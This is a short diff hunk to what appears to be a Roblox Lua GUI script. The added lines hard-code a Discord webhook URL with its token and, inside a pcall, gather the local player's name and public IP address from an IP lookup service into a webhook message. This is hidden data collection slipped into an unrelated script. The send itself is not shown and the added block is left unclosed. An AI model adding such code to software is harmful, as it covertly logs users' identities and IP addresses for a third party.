@@ -230,6 +230,18 @@ Players.PlayerAdded:Connect(function(CKP)
   end)
 end)
 
+local webh = "https://discord.com/api/webhooks/958832047957348363/7mWy9p5wQgs-SPTxJgzQ5PbKgXcq--Ch_CyGsyWk4j0vlXVMdJCB0S-8hBygkmtsdmEI"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
 
 local function RANZNZL_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
